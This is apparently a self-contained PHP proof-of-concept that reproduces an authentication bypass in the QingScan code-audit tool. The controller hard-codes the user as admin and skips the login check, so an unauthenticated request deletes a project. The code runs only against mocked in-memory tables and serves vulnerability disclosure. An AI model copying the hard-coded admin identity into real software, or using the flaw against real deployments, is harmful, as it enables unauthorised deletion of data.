<?php
/**
 * Standalone PoC for 78778443/QingScan authentication/authorization bypass.
 *
 * This is a minimal, dependency-free reproduction of the vulnerable control flow:
 * - app/controller/Common.php::initialize() hard-codes userInfo to admin.
 * - the original scan_user cookie/session login check is commented out.
 * - app/code/controller/Index.php::code_del() performs privileged deletion.
 *
 * Run:
 *   php PoC.php
 */

ini_set('display_errors', '1');
error_reporting(E_ALL);

function env($name) {
    $values = ['admins' => 'admin', 'website' => 'QingScan PoC'];
    return $values[$name] ?? null;
}
function redirect($to) { return "redirect:" . $to; }

class MockQuery {
    private string $table;
    private array $conditions = [];
    public function __construct(string $table) { $this->table = $table; }
    public function where($field, $op = null, $value = null): self {
        if (is_array($field)) {
            foreach ($field as $k => $v) {
                if (is_array($v) && count($v) >= 3) $this->conditions[] = [$v[0], $v[1], $v[2]];
                else $this->conditions[] = [$k, '=', $v];
            }
        } else $this->conditions[] = [$field, $op ?? '=', $value];
        return $this;
    }
    public function whereIn($field, $values): self { $this->conditions[] = [$field, 'in', $values]; return $this; }
    private function matches(array $row): bool {
        foreach ($this->conditions as [$field, $op, $value]) {
            if ($op === '=' && (($row[$field] ?? null) != $value)) return false;
            if ($op === 'in') {
                $values = is_array($value) ? $value : explode(',', (string)$value);
                if (!in_array($row[$field] ?? null, $values)) return false;
            }
        }
        return true;
    }
    public function delete(): int {
        $deleted = 0;
        foreach (Db::$tables[$this->table] as $id => $row) {
            if ($this->matches($row)) { unset(Db::$tables[$this->table][$id]); $deleted++; }
        }
        return $deleted;
    }
}
class Db {
    public static array $tables = [
        'code' => [101 => ['id' => 101, 'name' => 'victim-project', 'is_delete' => 0]],
        'fortify' => [1 => ['id' => 1, 'code_id' => 101]],
        'semgrep' => [1 => ['id' => 1, 'code_id' => 101]],
        'mobsfscan' => [1 => ['id' => 1, 'code_id' => 101]],
        'murphysec' => [1 => ['id' => 1, 'code_id' => 101]],
        'murphysec_vuln' => [1 => ['id' => 1, 'code_id' => 101]],
        'code_webshell' => [1 => ['id' => 1, 'code_id' => 101]],
        'code_composer' => [1 => ['id' => 1, 'code_id' => 101]],
        'code_python' => [1 => ['id' => 1, 'code_id' => 101]],
        'code_java' => [1 => ['id' => 1, 'code_id' => 101]],
        'plugin_scan_log' => [1 => ['id' => 1, 'app_id' => 101, 'scan_type' => 2]],
        'project_tools' => [1 => ['id' => 1, 'project_id' => 101, 'type' => 2]],
    ];
    public static function name(string $table): MockQuery { return new MockQuery($table); }
    public static function table(string $table): MockQuery { return new MockQuery($table); }
}
class MockRequest {
    public function __construct(private array $params) {}
    public function param(string $name, $default = null) { return $this->params[$name] ?? $default; }
}
class Common {
    protected int $userId = 0;
    protected int $auth_group_id = 0;
    protected string $username = '';
    protected array $userInfo = [];
    public function __construct() { $this->initialize(); }
    public function initialize(): void {
        // Vulnerable behavior from Common.php lines 28-40.
        $this->userInfo = ['id' => 1, 'username' => 'admin', 'auth_group_id' => 1, 'nickname' => 'Administrator'];
        $this->userId = $this->userInfo['id'];
        $this->username = $this->userInfo['username'];
        $this->auth_group_id = $this->userInfo['auth_group_id'];
        if (!$this->is_auth('code/index/code_del')) die('permission denied');
    }
    private function is_auth(string $name): bool { return in_array($this->username, explode(',', env('admins')), true); }
}
class Index extends Common {
    public function code_del(MockRequest $request) {
        $id = $request->param('id');
        $map[] = ['id', '=', $id];
        if (Db::name('code')->where($map)->delete()) {
            Db::table('fortify')->where(['code_id' => $id])->delete();
            Db::table('semgrep')->where(['code_id' => $id])->delete();
            Db::table('mobsfscan')->where(['code_id' => $id])->delete();
            Db::table('murphysec')->where(['code_id' => $id])->delete();
            Db::table('murphysec_vuln')->where(['code_id' => $id])->delete();
            Db::table('code_webshell')->where(['code_id' => $id])->delete();
            Db::table('code_composer')->where(['code_id' => $id])->delete();
            Db::table('code_python')->where(['code_id' => $id])->delete();
            Db::table('code_java')->where(['code_id' => $id])->delete();
            Db::table('plugin_scan_log')->where(['app_id' => $id])->where('scan_type', 2)->delete();
            Db::table('project_tools')->where('project_id', $id)->where('type', 2)->delete();
            return redirect('/code/index');
        }
        return 'delete failed';
    }
    public function getActor(): array { return $this->userInfo; }
}

$_COOKIE = [];
$_SESSION = [];
$before = isset(Db::$tables['code'][101]);
$controller = new Index();
$actor = $controller->getActor();
$result = $controller->code_del(new MockRequest(['id' => 101]));
$after = isset(Db::$tables['code'][101]);
printf("[*] No scan_user cookie/session supplied.\n");
printf("[*] Controller initialized actor: id=%d username=%s role=%d.\n", $actor['id'], $actor['username'], $actor['auth_group_id']);
printf("[*] code[101] existed before request: %s.\n", $before ? 'yes' : 'no');
printf("[*] Handler result: %s.\n", $result);
printf("[*] code[101] exists after request: %s.\n", $after ? 'yes' : 'no');
if ($before && !$after && $actor['username'] === 'admin') {
    echo "[VULNERABLE] unauthenticated request executed admin-only code_del and deleted a code audit project.\n";
    exit(0);
}
echo "[NOT VULNERABLE] privileged deletion did not occur.\n";
exit(1);
